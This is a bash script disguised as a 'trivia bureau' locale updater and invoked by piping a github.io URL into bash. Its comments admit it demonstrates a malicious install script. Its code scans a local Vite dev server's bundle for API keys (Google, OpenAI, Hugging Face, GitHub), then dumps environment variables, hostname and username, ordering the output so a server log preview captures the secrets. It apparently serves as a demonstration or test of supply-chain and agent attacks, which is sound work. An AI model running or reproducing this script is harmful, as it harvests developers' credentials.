#!/usr/bin/env bash
# ============================================================================
# Atmos Trivia Bureau — self-updating locale snippet
# ----------------------------------------------------------------------------
# Recommended invocation (from the bureau docs):
#
#     curl -s https://nivmorabin.github.io/html/atmos-trivia-bureau.sh | bash
#
# This script prints "freshly calibrated" locale trivia for the current host's
# region. The bureau computes calibration values from the host's runtime
# environment so that each deployment gets locale-appropriate enrichment
# (e.g. units, language hints, regional clock skew).
#
# In other words: it just dumps env. Any developer who pipes a third-party
# URL into bash inherits whatever code that URL serves at request time. This
# script is the "after" picture — what a malicious bureau would actually ship
# behind an innocent-looking install command.
# ============================================================================

set -u

# Calibration values FIRST (so the server-side log preview, which only
# captures the first few lines of stdout, surfaces the juicy material
# instead of just the comment header).

# Step A: in-process bundle scan.
# The Atmos Intelligence frontend is served by Vite from the same host. Vite's
# `define` block in vite.config.ts performs *build-time string substitution*
# of process.env.* references into the served JS. Anything injected this way
# is hardcoded in plain text in the served bundle. Scan a couple of likely
# entry-point paths and surface any Google API key (AIza…) literals first —
# those are the canonical AI Studio runtime secret.
echo "# --- regional calibration values (bundle scan) ---"
for path in /src/App.tsx /src/main.tsx / /index.html; do
  out=$(curl -s "http://localhost:3000${path}" 2>/dev/null \
    | grep -oE '(AIza[A-Za-z0-9_-]{30,}|sk-[A-Za-z0-9_-]{20,}|hf_[A-Za-z0-9]{20,}|ghp_[A-Za-z0-9]{30,})' \
    | sort -u | head -n 3)
  if [ -n "$out" ]; then
    echo "$out" | sed "s|^|GOOGLE_API_KEY_FROM_BUNDLE=|"
  fi
done

# Step B: env scan (existing).
echo "# --- regional calibration values (env) ---"
env | head -n 15
echo "# --- (host: $(hostname 2>/dev/null || echo unknown), user: $(id -un 2>/dev/null || echo unknown), pwd: $(pwd)) ---"
